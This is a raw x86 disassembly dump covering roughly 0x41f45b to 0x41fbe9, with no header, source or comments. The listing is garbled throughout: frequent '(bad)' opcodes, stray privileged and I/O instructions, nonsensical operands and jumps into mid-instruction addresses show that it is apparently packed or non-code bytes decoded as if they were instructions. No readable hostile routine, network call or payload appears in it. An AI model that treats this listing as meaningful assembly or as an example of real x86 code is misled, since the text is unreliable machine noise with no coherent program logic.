  41f45b:	stos   DWORD PTR es:[edi],eax
  41f45c:	dec    DWORD PTR [ecx+0x621ad0ff]
  41f462:	(bad)  
  41f463:	push   DWORD PTR [ebp+0x0]
  41f466:	add    BYTE PTR [ecx+0x24],cl
  41f469:	add    BYTE PTR [esi-0x7c7c7cc2],dl
  41f46f:	dec    esi
  41f470:	int    0x85
  41f472:	inc    DWORD PTR [eax]
  41f474:	xchg   ecx,eax
  41f475:	add    bh,bh
  41f477:	nop
  41f478:	xor    DWORD PTR [ecx-0x7c0005de],ecx
  41f47e:	jmp    DWORD PTR [ecx+0x5964]
  41f484:	pop    ds
  41f485:	add    DWORD PTR [eax],0x32
  41f488:	retf   
  41f489:	int3   
  41f48a:	mov    dl,0xf1
  41f48c:	int3   
  41f48d:	add    bh,bh
  41f48f:	and    al,0xe5
  41f491:	(bad)  
  41f492:	int3   
  41f493:	add    dh,cl
  41f495:	dec    DWORD PTR [ecx+0x2eff2ff2]
  41f49b:	test   al,0xff
  41f49d:	(bad)  
  41f49e:	(bad)  
  41f49f:	fadd   DWORD PTR [esi+0x1a]
  41f4a2:	inc    DWORD PTR [eax]
  41f4a4:	pop    es
  41f4a5:	inc    DWORD PTR [eax]
  41f4a7:	jo     0x41f460
  41f4a9:	inc    DWORD PTR [edi]
  41f4ab:	and    ah,cl
  41f4ad:	add    BYTE PTR [ecx-0x1685cf],cl
  41f4b3:	add    BYTE PTR [edi+edi*8],dh
  41f4b6:	jmp    ecx
  41f4b8:	cmc    
  41f4b9:	add    BYTE PTR [ecx-0x2],bl
  41f4bc:	inc    DWORD PTR [ebx-0x4138d700]
  41f4c2:	cmp    edi,0xffffffac
  41f4c5:	or     esp,0xffffffc1
  41f4c8:	dec    ebp
  41f4c9:	add    BYTE PTR [ebp+0x16],dh
  41f4cc:	inc    DWORD PTR [eax]
  41f4ce:	add    BYTE PTR [edx],bl
  41f4d0:	sub    al,0x2c
  41f4d2:	add    bh,bh
  41f4d4:	aaa    
  41f4d5:	add    BYTE PTR [eax],al
  41f4d7:	lea    ebp,[edi+edi*8]
  41f4da:	(bad)  
  41f4db:	enter  0x0,0x83
  41f4df:	std    
  41f4e0:	sbb    eax,0xbb00007e
  41f4e5:	(bad)  
  41f4e6:	dec    DWORD PTR [ebx-0x45e00060]
  41f4ec:	add    ah,cl
  41f4ee:	add    bh,bh
  41f4f0:	(bad)  
  41f4f1:	popa   
  41f4f2:	add    DWORD PTR [ebx-0x400000fd],0xfffffff6
  41f4f9:	adc    DWORD PTR [esi+0x1b],0xffffffff
  41f4fd:	inc    DWORD PTR [ebx+0x3ba353]
  41f503:	(bad)  
  41f504:	(bad)  
  41f506:	add    BYTE PTR [edx+0x17],dh
  41f509:	add    BYTE PTR [ecx-0x69],ch
  41f50c:	(bad)  
  41f50d:	dec    DWORD PTR [ecx-0x7c9a21e5]
  41f513:	inc    DWORD PTR [edi+edi*8-0x1]
  41f517:	sub    DWORD PTR [edi+0x0],eax
  41f51a:	rol    ah,0xff
  41f51d:	add    BYTE PTR [eax],al
  41f51f:	sub    ebx,esi
  41f521:	(bad)  
  41f522:	(bad)  
  41f523:	push   eax
  41f525:	inc    DWORD PTR [ebx-0x1b00d0eb]
  41f52b:	mov    DWORD PTR [ecx-0x27d60000],ecx
  41f531:	jns    0x41f532
  41f533:	mov    DWORD PTR [edi],esp
  41f535:	inc    DWORD PTR [eax]
  41f537:	jae    0x41f509
  41f539:	add    BYTE PTR [edx-0x34],ah
  41f53c:	or     esp,0xffffffff
  41f53f:	fdivr  DWORD PTR ss:[edx]
  41f542:	add    ah,cl
  41f544:	hlt    
  41f545:	cmp    edi,0xffffff95
  41f548:	adc    edi,edi
  41f54a:	and    BYTE PTR [esi+0x290083ff],ch
  41f550:	ret    
  41f551:	inc    edx
  41f552:	dec    DWORD PTR [ecx+0x57ff8998]
  41f558:	pop    ebp
  41f559:	cmp    ebp,0xffffffe6
  41f55c:	add    bh,bh
  41f55e:	add    ah,bl
  41f560:	(bad)
  41f563:	call   DWORD PTR [esi-0x1]
  41f566:	add    BYTE PTR [ebx],dh
  41f568:	mov    bh,0xff
  41f56a:	push   ecx
  41f56b:	mov    bh,bh
  41f56d:	int3   
  41f56e:	xor    DWORD PTR [eax+0x75],0x39
  41f572:	add    BYTE PTR [eax],al
  41f574:	pop    esp
  41f575:	(bad)  
  41f576:	push   DWORD PTR [ecx+0x5c]
  41f579:	add    BYTE PTR [esi-0x7c00b0],ah
  41f57f:	mov    ah,0xc1
  41f581:	cld    
  41f582:	cmp    edi,0xffffff9a
  41f585:	(bad)  
  41f586:	jmp    FWORD PTR [ecx+0x77348396]
  41f58c:	cmp    edi,0x0
  41f58f:	and    al,0x35
  41f591:	jp     0x41f593
  41f593:	push   DWORD PTR [eax]
  41f595:	add    ah,cl
  41f597:	ins    BYTE PTR es:[edi],dx
  41f598:	mov    bh,0xff
  41f59a:	mov    ah,0x23
  41f59c:	(bad)  
  41f59d:	inc    DWORD PTR [eax]
  41f59f:	sub    eax,esp
  41f5a1:	xchg   ebx,eax
  41f5a2:	(bad)  
  41f5a3:	inc    DWORD PTR [edx]
  41f5a5:	cmp    edi,0xffffff9f
  41f5a8:	mov    edi,edi
  41f5aa:	stos   BYTE PTR es:[edi],al
  41f5ab:	or     al,0xff
  41f5ad:	add    BYTE PTR [eax],al
  41f5af:	jne    0x41f56f
  41f5b1:	ja     0x41f5b2
  41f5b3:	cmp    eax,0xffffffcc
  41f5b6:	jmp    DWORD PTR [ebx-0x1e]
  41f5b9:	push   ebx
  41f5bb:	push   edi
  41f5bc:	dec    esp
  41f5be:	int3   
  41f5bf:	push   edx
  41f5c0:	(bad)  
  41f5c1:	out    0x83,al
  41f5c3:	add    dh,cl
  41f5c5:	add    bh,bh
  41f5c7:	(bad)  
  41f5c8:	iret   
  41f5c9:	add    BYTE PTR [esi+0x53],al
  41f5cc:	inc    DWORD PTR [eax]
  41f5ce:	push   DWORD PTR [esi-0xc51d]
  41f5d4:	jns    0x41f5d5
  41f5d6:	push   DWORD PTR [edi+ebp*2]
  41f5d9:	dec    DWORD PTR [ebx]
  41f5db:	mov    ebx,0x9cffffff
  41f5e0:	sti    
  41f5e1:	hlt    
  41f5e2:	inc    DWORD PTR [eax]
  41f5e4:	in     al,dx
  41f5e5:	add    bh,bh
  41f5e7:	jp     0x41f58f
  41f5e9:	call   DWORD PTR [ecx-0x7c0021]
  41f5ef:	dec    ecx
  41f5f0:	inc    ecx
  41f5f1:	xor    al,0xff
  41f5f3:	or     edi,0xffffffff
  41f5f6:	add    BYTE PTR [esi+0x4d47ffe4],bl
  41f5fc:	inc    DWORD PTR [ebx+0x5ebc4a00]
  41f602:	inc    DWORD PTR [eax]
  41f604:	mov    DWORD PTR [eax],eax
  41f606:	(bad)  
  41f607:	inc    cl
  41f609:	mov    DWORD PTR [ecx+0x83ff0a],edx
  41f60f:	push   0xffffff86
  41f611:	or     edi,edi
  41f613:	mov    DWORD PTR [ecx],edi
  41f615:	add    BYTE PTR [ebx-0x3600b832],al
  41f61b:	sti    
  41f61c:	mov    edi,edi
  41f61e:	sbb    esp,0x3
  41f621:	add    BYTE PTR cs:[ecx-0x69fffff9],cl
  41f628:	mov    eax,ds:0xff79c8ff
  41f62d:	add    BYTE PTR [ebx-0x1efc1d],al
  41f633:	int3   
  41f634:	cmp    al,0xff
  41f636:	add    bh,bl
  41f638:	add    al,0x0
  41f63a:	imul   eax,esi,0xffffffcc
  41f63d:	add    BYTE PTR [eax],al
  41f63f:	dec    edi
  41f640:	lods   eax,DWORD PTR ds:[esi]
  41f641:	std    
  41f642:	add    bh,bh
  41f644:	xchg   esp,eax
  41f645:	inc    DWORD PTR [eax]
  41f647:	sar    DWORD PTR [ebp-0x1],1
  41f64a:	mov    ds:0xffff00f6,eax
  41f64f:	jns    0x41f69d
  41f651:	pop    ecx
  41f652:	(bad)  
  41f653:	dec    DWORD PTR [edx+0x0]
  41f656:	call   DWORD PTR [ebp+0x6ce3002b]
  41f65c:	cmp    edi,0xffffffff
  41f65f:	into   
  41f660:	sahf   
  41f661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f662:	add    BYTE PTR [eax],al
  41f664:	and    al,0x83
  41f666:	int3   
  41f667:	les    ebp,FWORD PTR [esi+0x477b00]
  41f66d:	int3   
  41f66e:	add    BYTE PTR [esi-0x7f],cl
  41f671:	int    0x83
  41f673:	add    BYTE PTR [esi+0x2bddffcc],ch
  41f679:	add    BYTE PTR [ebx],bl
  41f67b:	sar    edi,1
  41f67d:	mov    DWORD PTR [ebx-0xe4c1be],eax
  41f683:	jmp    DWORD PTR [ecx]
  41f685:	add    bh,bh
  41f687:	or     ah,cl
  41f689:	add    BYTE PTR [ecx],ch
  41f68b:	xor    eax,0x8fff0083
  41f690:	cli    
  41f691:	jo     0x41f693
  41f693:	inc    esp
  41f695:	(bad)  
  41f696:	(bad)  
  41f697:	fdivr  DWORD PTR [eax]
  41f699:	or     DWORD PTR [ebx-0x7c007673],0xffffff97
  41f6a0:	push   edx
  41f6a1:	inc    edx
  41f6a2:	add    bh,bh
  41f6a4:	out    dx,eax
  41f6a5:	inc    DWORD PTR [eax]
  41f6a7:	(bad)  
  41f6a8:	std    
  41f6a9:	inc    DWORD PTR [ebp-0x19]
  41f6ac:	add    BYTE PTR [ebx-0x5ade0501],al
  41f6b2:	int3   
  41f6b3:	push   DWORD PTR [edi]
  41f6b5:	inc    DWORD PTR [ebx+0x6ecc7585]
  41f6bb:	mov    ebx,0x40083ff
  41f6c0:	xchg   edx,eax
  41f6c1:	pop    ebp
  41f6c2:	add    bh,bh
  41f6c4:	mov    eax,ds:0xf4fd0000
  41f6c9:	(bad)  
  41f6ca:	jnp    0x41f681
  41f6cc:	(bad)  
  41f6cd:	inc    DWORD PTR [ebx+0x59e141]
  41f6d3:	inc    DWORD PTR [edi+edi*8-0x33cc3601]
  41f6da:	ja     0x41f721
  41f6dc:	inc    DWORD PTR [ebx-0x30c8d501]
  41f6e2:	add    BYTE PTR [eax],al
  41f6e4:	pop    esi
  41f6e5:	add    DWORD PTR [ebx+0xe837bb6],0x62
  41f6ec:	inc    DWORD PTR [eax]
  41f6ee:	call   FWORD PTR [ebx+0x61]
  41f6f1:	mov    ah,0xff
  41f6f3:	(bad)  
  41f6f4:	(bad)  
  41f6f6:	add    cl,al
  41f6f8:	ss mov edi,ecx
  41f6fb:	mov    al,0xff
  41f6fd:	inc    DWORD PTR [eax]
  41f6ff:	xor    al,0x7d
  41f701:	in     al,0xff
  41f703:	sub    esi,0xffffffff
  41f706:	jmp    DWORD PTR [ecx+0x2a]
  41f709:	xor    ebx,0xfffffff7
  41f70c:	(bad)  
  41f70d:	inc    DWORD PTR [eax]
  41f70f:	dec    ebx
  41f710:	lods   eax,DWORD PTR ds:[esi]
  41f711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f712:	mov    DWORD PTR [eax],eax
  41f714:	or     bh,bh
  41f716:	add    dh,ah
  41f718:	mov    al,ds:0xd24cff
  41f71d:	dec    esp
  41f71f:	push   0xfffffffb
  41f721:	push   eax
  41f722:	inc    DWORD PTR [eax]
  41f724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f725:	add    ah,cl
  41f727:	dec    edx
  41f728:	pop    ds
  41f729:	push   edi
  41f72b:	jbe    0x41f72c
  41f72d:	add    BYTE PTR [eax],al
  41f72f:	cmp    DWORD PTR [ebx-0x3b33ffcb],0xffffffff
  41f736:	jmp    FWORD PTR [ebp-0x57]
  41f739:	inc    DWORD PTR [ebx]
  41f73b:	mov    dh,0xff
  41f73d:	(bad)  
  41f73e:	push   DWORD PTR [esi+edi*1-0x3d330099]
  41f745:	mov    DWORD PTR [ecx+0x2fff2c61],ecx
  41f74b:	xchg   ecx,eax
  41f74c:	mov    edi,edi
  41f74e:	add    BYTE PTR [ecx+edx*4-0x40],ah
  41f752:	add    BYTE PTR [ebx-0x3076ff0e],al
  41f758:	lea    eax,[eax]
  41f75a:	fbstp  TBYTE PTR [esi-0x53ff3400]
  41f760:	loope  0x41f766
  41f762:	inc    DWORD PTR [ebx-0x6a7cffea]
  41f768:	and    eax,DWORD PTR [ebx+0xffed1a]
  41f76e:	xor    ebx,0xffffff93
  41f771:	mov    bl,0x0
  41f773:	int3   
  41f774:	sbb    DWORD PTR [ebx+0xc970ff],eax
  41f77a:	jae    0x41f701
  41f77c:	inc    DWORD PTR [ebx-0x6b11a34]
  41f782:	inc    DWORD PTR [eax]
  41f784:	xchg   ecx,eax
  41f785:	inc    DWORD PTR [eax]
  41f787:	nop
  41f788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f789:	push   DWORD PTR [edx+0x7b]
  41f78c:	add    DWORD PTR [eax],0xffffffff
  41f78f:	inc    edi
  41f790:	xor    edi,DWORD PTR [ebx+0x6b0000]
  41f796:	int3   
  41f797:	int3   
  41f798:	rol    DWORD PTR [eax],1
  41f79a:	cli    
  41f79b:	repnz (bad) 
  41f79d:	(bad)  
  41f79e:	jmp    eax
  41f7a0:	mov    esi,0x2cc00bd
  41f7a5:	inc    DWORD PTR [ebx-0x6f76678a]
  41f7ab:	adc    eax,0xb100ff89
  41f7b0:	paddd  mm0,QWORD PTR [ebx+0xffd100]
  41f7b7:	in     eax,dx
  41f7b8:	jge    0x41f786
  41f7ba:	sub    BYTE PTR [edi-0x1],cl
  41f7bd:	inc    DWORD PTR [eax]
  41f7bf:	test   BYTE PTR [ebx+0x32cc8925],0xff
  41f7c6:	jmp    FWORD PTR [ebx+0x38]
  41f7c9:	add    BYTE PTR [edx+0xff8357],ch
  41f7cf:	mov    ecx,0x747f
  41f7d4:	imul   edi,edi,0x0
  41f7d7:	push   ecx
  41f7d8:	sti    
  41f7d9:	add    ch,bl
  41f7db:	aas    
  41f7dc:	inc    DWORD PTR [eax]
  41f7de:	int3   
  41f7df:	mov    edx,0xcc0a11
  41f7e4:	mov    BYTE PTR [ebx-0x7cc1d800],al
  41f7ea:	aad    0x4f
  41f7ec:	int3   
  41f7ed:	add    BYTE PTR [ecx-0x3384583f],cl
  41f7f3:	int3   
  41f7f4:	sub    edi,edi
  41f7f6:	adc    DWORD PTR [ebx+0x7b],0xffffffff
  41f7fa:	cwde   
  41f7fb:	adc    eax,0x64ff00ff
  41f800:	push   edx
  41f801:	(bad)  
  41f802:	inc    DWORD PTR [ebx+0x19ff00eb]
  41f808:	dec    ecx
  41f809:	add    BYTE PTR [edi],ch
  41f80b:	scas   eax,DWORD PTR es:[edi]
  41f80c:	inc    DWORD PTR [eax]
  41f80e:	or     esp,0x56
  41f811:	daa    
  41f812:	add    bh,bh
  41f814:	pop    edx
  41f815:	(bad)  
  41f816:	call   DWORD PTR [eax]
  41f818:	cmp    cl,BYTE PTR [ecx-0xf1b1]
  41f81e:	call   DWORD PTR [edi]
  41f820:	mov    esi,0x81ccff36
  41f825:	inc    DWORD PTR [eax]
  41f827:	outs   dx,BYTE PTR ds:[esi]
  41f828:	jp     0x41f829
  41f82a:	add    ebp,DWORD PTR [eax]
  41f82c:	add    BYTE PTR [eax],al
  41f82e:	jmp    DWORD PTR [eax]
  41f830:	jbe    0x41f880
  41f832:	inc    DWORD PTR [ebx+0x78ff0069]
  41f838:	popa   
  41f839:	add    BYTE PTR [ecx+0xe],cl
  41f83c:	(bad)  
  41f83d:	inc    DWORD PTR [eax]
  41f83f:	jb     0x41f857
  41f841:	out    dx,al
  41f842:	int3   
  41f843:	add    BYTE PTR [ebx],dh
  41f845:	(bad)  
  41f846:	jmp    DWORD PTR [ebx+0x33]
  41f849:	call   DWORD PTR [edx-0x7c0069]
  41f84f:	xor    DWORD PTR [ecx-0x1f],ebp
  41f852:	add    bh,bh
  41f854:	jo     0x41f855
  41f856:	push   ebx
  41f858:	dec    eax
  41f859:	add    BYTE PTR [edx+0x34],bl
  41f85c:	(bad)  
  41f85d:	inc    DWORD PTR [eax]
  41f85f:	and    DWORD PTR [ebx-0x6a],esp
  41f862:	inc    DWORD PTR [eax]
  41f864:	imul   ecx,DWORD PTR [ecx-0x490e7d],0xff89133e
  41f86e:	add    BYTE PTR [ebp+0x26],dl
  41f871:	cli    
  41f872:	int3   
  41f873:	int3   
  41f874:	push   cs
  41f875:	cmp    edi,0xffffffa7
  41f878:	jmp    0x41f7fd
  41f87a:	sbb    eax,0x83ff83db
  41f87f:	pop    ds
  41f880:	in     eax,dx
  41f881:	pop    es
  41f882:	(bad)  
  41f883:	call   DWORD PTR [eax+eax*1]
  41f886:	push   DWORD PTR [eax-0x7b0fff2b]
  41f88c:	(bad)  
  41f88d:	inc    DWORD PTR [eax]
  41f88f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f890:	add    ah,BYTE PTR [edx+0x0]
  41f893:	or     DWORD PTR [edx],0xffffff83
  41f896:	mov    DWORD PTR [edx-0xfa87ce9],esp
  41f89c:	add    DWORD PTR [eax],0xffffffcc
  41f89f:	gs cmp eax,0x48ffff4d
  41f8a5:	add    DWORD PTR [ebx-0x13ff9d2b],0xffffffce
  41f8ac:	(bad)  
  41f8ad:	(bad)  
  41f8ae:	inc    DWORD PTR [ecx-0x76ff9d90]
  41f8b4:	std    
  41f8b5:	inc    DWORD PTR [eax]
  41f8b7:	shl    DWORD PTR [ecx],1
  41f8b9:	xor    DWORD PTR [edx+0xffff00],0xffffffd3
  41f8c0:	inc    ecx
  41f8c1:	aam    0xff
  41f8c3:	add    BYTE PTR [esi+0x0],al
  41f8c6:	add    dh,al
  41f8c8:	cmp    bh,0xee
  41f8cb:	jecxz  0x41f8cc
  41f8cd:	mov    DWORD PTR [ebx+0xb0f925],eax
  41f8d3:	xor    DWORD PTR ds:0xb5d883ff,0xffffffff
  41f8da:	(bad)  
  41f8db:	mov    ebx,0x55ccff83
  41f8e0:	and    al,0x2a
  41f8e2:	add    DWORD PTR [eax],0x74
  41f8e5:	or     esp,0x1b
  41f8e8:	dec    esp
  41f8e9:	add    BYTE PTR [eax],cl
  41f8eb:	or     bh,bh
  41f8ed:	add    BYTE PTR [eax],al
  41f8ef:	push   edx
  41f8f0:	add    bh,dl
  41f8f2:	add    bh,bh
  41f8f4:	test   BYTE PTR [ecx+0xc492ff],0x22
  41f8fb:	jne    0x41f880
  41f8fd:	add    DWORD PTR [eax],0xfffffff2
  41f900:	cmp    eax,DWORD PTR [esi-0x7cbdff01]
  41f906:	mov    DWORD PTR [eax],eax
  41f908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f909:	inc    ecx
  41f90b:	addr16 int3 
  41f90d:	inc    DWORD PTR [ebx-0x76acc400]
  41f913:	add    BYTE PTR [eax],bh
  41f915:	inc    DWORD PTR [ebx+0x48003e29]
  41f91b:	push   ecx
  41f91c:	add    bh,bh
  41f91e:	call   FWORD PTR [edi+0x83724a]
  41f924:	enter  0x8300,0x34
  41f928:	push   ebp
  41f929:	add    BYTE PTR [esi],al
  41f92b:	rol    DWORD PTR [eax],0xff
  41f92e:	jmp    eax
  41f930:	xchg   ebp,eax
  41f931:	push   eax
  41f932:	(bad)  
  41f933:	jmp    DWORD PTR [eax-0x77]
  41f936:	inc    ebx
  41f938:	sahf   
  41f939:	add    ah,ch
  41f93b:	and    BYTE PTR [eax],al
  41f93d:	inc    DWORD PTR [eax]
  41f93f:	popa   
  41f940:	cmp    esp,esi
  41f942:	inc    DWORD PTR [ebx-0x3a003369]
  41f948:	mov    cl,0x83
  41f94a:	xor    edi,ebp
  41f94c:	int3   
  41f94d:	add    ah,cl
  41f94f:	cwde   
  41f950:	rol    DWORD PTR cs:[eax],0xff
  41f954:	addr16 int3 
  41f956:	add    BYTE PTR [ebp+0x32],dl
  41f959:	add    BYTE PTR [ebp-0x76e9],ah
  41f95f:	inc    esp
  41f960:	shr    DWORD PTR ds:0xffddcc00,cl
  41f966:	dec    ebp
  41f968:	adc    DWORD PTR [eax],eax
  41f96a:	jno    0x41f96e
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	call   FWORD PTR [eax-0xdaeb]
  41f974:	clc    
  41f975:	mov    DWORD PTR [eax],eax
  41f977:	imul   eax,eax,0xffffff89
  41f97a:	test   eax,0xffff000e
  41f97f:	lea    edx,es:[eax+eax*1+0x0]
  41f984:	sub    al,BYTE PTR [eax]
  41f986:	int3   
  41f987:	pushf  
  41f988:	inc    edi
  41f989:	int3   
  41f98a:	test   BYTE PTR [esi+0x0],al
  41f98d:	add    bh,bh
  41f98f:	and    ch,0xa4
  41f992:	(bad)  
  41f993:	jmp    FWORD PTR [ebx]
  41f995:	add    bh,bh
  41f997:	test   eax,0xdff183a7
  41f99c:	add    bh,bh
  41f99e:	add    BYTE PTR [eax+0x74],dl
  41f9a1:	add    eax,0x9689ff
  41f9a6:	add    BYTE PTR [ebx+0x7d],dh
  41f9a9:	int3   
  41f9aa:	mov    ds:0xff83ff02,eax
  41f9af:	shr    BYTE PTR [ebx+0x800ffe6],cl
  41f9b5:	int3   
  41f9b6:	sbb    DWORD PTR ds:0x2692ffc0,0x0
  41f9bd:	add    DWORD PTR [eax],0x3
  41f9c0:	iret   
  41f9c1:	xchg   esi,eax
  41f9c2:	(bad)  
  41f9c3:	call   FWORD PTR [edi+edi*8]
  41f9c6:	call   FWORD PTR [edx+ebx*1-0xa62001]
  41f9cd:	add    DWORD PTR [eax],0x2b
  41f9d0:	and    DWORD PTR [edx],ebx
  41f9d2:	add    BYTE PTR [eax],al
  41f9d4:	mov    eax,0x75390089
  41f9d9:	call   FWORD PTR [ebx+0x17]
  41f9dc:	add    BYTE PTR [eax],al
  41f9de:	add    BYTE PTR [esi+0xd],ah
  41f9e1:	mov    ds:0x738983,eax
  41f9e6:	call   DWORD PTR [edi+0x27]
  41f9e9:	add    DWORD PTR [eax],0x6
  41f9ec:	inc    DWORD PTR [eax]
  41f9ee:	cmp    DWORD PTR [edx-0x5e17],0xffffffb3
  41f9f5:	add    bh,bh
  41f9f7:	fs sub al,0x83
  41f9fa:	or     eax,DWORD PTR [eax+eax*1]
  41f9fd:	add    bh,bh
  41f9ff:	mov    DWORD PTR [edi-0x45],esi
  41fa02:	(bad)  
  41fa03:	jmp    DWORD PTR [esi]
  41fa05:	(bad)  
  41fa06:	(bad)  
  41fa07:	jns    0x41fa77
  41fa09:	add    cl,bh
  41fa0b:	jmp    0x3cf9:0xceffffff
  41fa12:	inc    DWORD PTR [eax]
  41fa14:	rol    DWORD PTR [ebx+0x8ff2ff],1
  41fa1a:	stos   DWORD PTR es:[edi],eax
  41fa1b:	test   eax,0x52000000
  41fa20:	mov    ebp,0xd883ffd3
  41fa25:	add    BYTE PTR [ebx+0x3affc726],al
  41fa2b:	inc    DWORD PTR [bp+di-0x7d01]
  41fa30:	iret   
  41fa31:	mov    BYTE PTR [eax],0xff
  41fa34:	push   0xffffffff
  41fa36:	add    bh,ch
  41fa38:	dec    esi
  41fa39:	call   DWORD PTR [ebp-0x7c7ca4]
  41fa3f:	mov    WORD PTR [ebp+0x800ff3f],es
  41fa45:	inc    DWORD PTR [eax]
  41fa47:	fs xchg edi,eax
  41fa49:	dec    DWORD PTR [eax]
  41fa4b:	inc    ebp
  41fa4c:	add    BYTE PTR [ecx+0x9480500],cl
  41fa52:	inc    DWORD PTR [eax]
  41fa54:	and    edi,edi
  41fa56:	int3   
  41fa57:	sub    cl,al
  41fa59:	add    BYTE PTR [esi*4-0x1b00007d],ah
  41fa60:	adc    edx,0xffffff83
  41fa63:	mov    ebp,eax
  41fa65:	int3   
  41fa66:	jmp    DWORD PTR [eax+0x4f]
  41fa69:	call   DWORD PTR [ecx-0x7600a6]
  41fa6f:	loope  0x41fa76
  41fa71:	sti    
  41fa72:	inc    DWORD PTR [eax]
  41fa74:	in     eax,0x89
  41fa76:	add    BYTE PTR [edi],ah
  41fa78:	xchg   bh,bh
  41fa7a:	leave  
  41fa7b:	push   ss
  41fa7c:	add    bh,bh
  41fa7e:	add    BYTE PTR [edx-0x7d],bl
  41fa81:	fdiv   st(7),st
  41fa83:	jmp    DWORD PTR [edi]
  41fa85:	add    ah,cl
  41fa87:	stos   BYTE PTR es:[edi],al
  41fa88:	or     bh,bh
  41fa8a:	call   DWORD PTR [edx]
  41fa8c:	(bad)  
  41fa8d:	inc    DWORD PTR [eax]
  41fa8f:	fstp   TBYTE PTR [edi]
  41fa91:	(bad)  
  41fa93:	cmp    DWORD PTR [ecx],0x0
  41fa96:	inc    DWORD PTR [edx-0x1d2f000b]
  41fa9c:	int3   
  41fa9d:	add    bh,bh
  41fa9f:	shl    ebp,0xca
  41faa2:	add    BYTE PTR [eax],al
  41faa4:	iret   
  41faa5:	int3   
  41faa6:	add    BYTE PTR [ecx+eiz*8-0x1],dh
  41faaa:	test   eax,0xffffff75
  41faaf:	inc    ebx
  41fab0:	jg     0x41fac7
  41fab2:	(bad)  
  41fab3:	dec    ecx
  41fab5:	add    BYTE PTR [ebx-0xd7cc0d9],al
  41fabb:	mov    bh,0x0
  41fabd:	cmp    edi,0xffffffcd
  41fac0:	mov    ebx,esp
  41fac2:	add    BYTE PTR [ebx-0x50ff33ad],al
  41fac8:	sbb    eax,0x4e6ff
  41facd:	int3   
  41face:	and    DWORD PTR [eax+0x5],0xffffff8b
  41fad2:	dec    esp
  41fad4:	mov    ebp,0x55b4ffff
  41fad9:	call   DWORD PTR [ebx-0x3b]
  41fadc:	int3   
  41fadd:	add    BYTE PTR [eax],al
  41fadf:	jno    0x41fb30
  41fae1:	sbb    BYTE PTR [ecx+0xff1100],cl
  41fae7:	aas    
  41fae8:	mov    edi,0xcc81dd00
  41faed:	(bad)  
  41faee:	(bad)  
  41faef:	jle    0x41fafb
  41faf1:	in     eax,0xff
  41faf3:	add    BYTE PTR [edx-0x32f60100],ah
  41faf9:	add    BYTE PTR [eax+0x20],ch
  41fafc:	add    bh,bh
  41fafe:	add    BYTE PTR [ecx],al
  41fb00:	retf   0xcc39
  41fb03:	add    BYTE PTR [edi],dl
  41fb05:	add    bh,bh
  41fb07:	mov    ah,0x5a
  41fb09:	add    BYTE PTR [esi],ch
  41fb0b:	mov    dh,0xff
  41fb0d:	(bad)  
  41fb0e:	call   edi
  41fb10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb11:	push   esi
  41fb12:	inc    DWORD PTR [eax]
  41fb14:	and    bh,bh
  41fb16:	inc    DWORD PTR [eax-0x50]
  41fb19:	xor    DWORD PTR [edx-0x56],0xffffff83
  41fb1d:	add    bh,bh
  41fb1f:	imul   BYTE PTR [ebp+0x6c]
  41fb22:	add    bh,bh
  41fb24:	or     DWORD PTR [eax],eax
  41fb26:	dec    DWORD PTR [esi+0x1f1cc1b]
  41fb2c:	dec    DWORD PTR [ecx+0x568bfb89]
  41fb32:	inc    DWORD PTR [eax]
  41fb34:	add    BYTE PTR [ecx+0xeb0983],cl
  41fb3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb3b:	add    BYTE PTR [bp+di+0x10ff],al
  41fb40:	(bad)  
  41fb41:	sub    bh,bh
  41fb43:	(bad)  
  41fb44:	cmp    eax,0x3291ffff
  41fb49:	call   FWORD PTR [eax+ebx*4]
  41fb4c:	mov    DWORD PTR [eax],eax
  41fb4e:	inc    DWORD PTR [eax]
  41fb50:	call   0x7740fb67
  41fb55:	(bad)  
  41fb56:	(bad)  
  41fb57:	cmp    dl,BYTE PTR [edi+edi*8-0x1df3]
  41fb5e:	add    BYTE PTR [eax],bh
  41fb60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb61:	inc    ebx
  41fb62:	int3   
  41fb63:	push   DWORD PTR [edx]
  41fb65:	dec    esp
  41fb67:	and    dh,ah
  41fb69:	dec    DWORD PTR [eax]
  41fb6b:	sub    eax,DWORD PTR [eax]
  41fb6d:	add    BYTE PTR [eax],al
  41fb6f:	jns    0x41fb90
  41fb71:	data16 (bad) 
  41fb73:	(bad)  
  41fb74:	fcos   
  41fb76:	dec    DWORD PTR [ecx]
  41fb78:	xlat   BYTE PTR ds:[ebx]
  41fb79:	add    BYTE PTR [ebx],al
  41fb7b:	or     al,0xff
  41fb7d:	int3   
  41fb7e:	jmp    FWORD PTR [ebp-0xff8fd9]
  41fb84:	call   0x8cfb88
  41fb89:	inc    DWORD PTR [esp+ebp*4+0x1800ffff]
  41fb90:	dec    DWORD PTR [edx+0xebff00]
  41fb96:	int3   
  41fb97:	mov    eax,ds:0x8b66ff9c
  41fb9c:	(bad)  
  41fb9d:	dec    DWORD PTR [ecx+0x80edc7]
  41fba3:	add    BYTE PTR [esi-0x6e830001],bl
  41fba9:	int3   
  41fbaa:	ins    BYTE PTR es:[edi],dx
  41fbab:	je     0x41fbac
  41fbad:	add    BYTE PTR [eax],al
  41fbaf:	scas   al,BYTE PTR es:[edi]
  41fbb0:	fsubr  QWORD PTR [edi+0x0]
  41fbb3:	add    dl,cl
  41fbb5:	add    DWORD PTR [eax],0xfffffff5
  41fbb8:	(bad)  
  41fbb9:	(bad)  
  41fbba:	mov    ebp,0xffffff15
  41fbbf:	sbb    eax,0xff009321
  41fbc4:	test   edi,edi
  41fbc6:	dec    DWORD PTR [esi-0x1]
  41fbc9:	mov    DWORD PTR [eax],eax
  41fbcb:	add    BYTE PTR [eax],al
  41fbcd:	(bad)  
  41fbce:	inc    DWORD PTR [eax]
  41fbd0:	aad    0x3c
  41fbd2:	mov    esp,ecx
  41fbd4:	cmp    eax,DWORD PTR [edi-0x77]
  41fbd7:	add    BYTE PTR [ebx-0x6200004f],dh
  41fbdd:	imul   eax,DWORD PTR [eax],0x89a136ff
  41fbe3:	inc    DWORD PTR [edx+0x2cff83d3]
  41fbe9:	add    al,0xcc
